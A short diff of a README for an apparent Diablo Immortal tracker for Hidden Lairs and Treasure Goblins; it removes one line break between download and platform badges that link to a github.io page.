@@ -3,7 +3,6 @@
 > The best treasures in Sanctuary are not marked on any map. This tool uses community intelligence to guide you to the game's most lucrative secrets: Hidden Lairs and Treasure Goblins.
 
 [![Download Tracker](https://img.shields.io/badge/⬇️_Download_Tracker-blueviolet?style=for-the-badge)](https://diablo-immortal-cartographers.github.io/.github) <br>
-<br>
 [![Windows](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows)](https://diablo-immortal-cartographers.github.io/.github) <br>
 [![macOS](https://img.shields.io/badge/Platform-macOS-lightgrey?style=flat-square&logo=apple)](https://diablo-immortal-cartographers.github.io/.github)
 
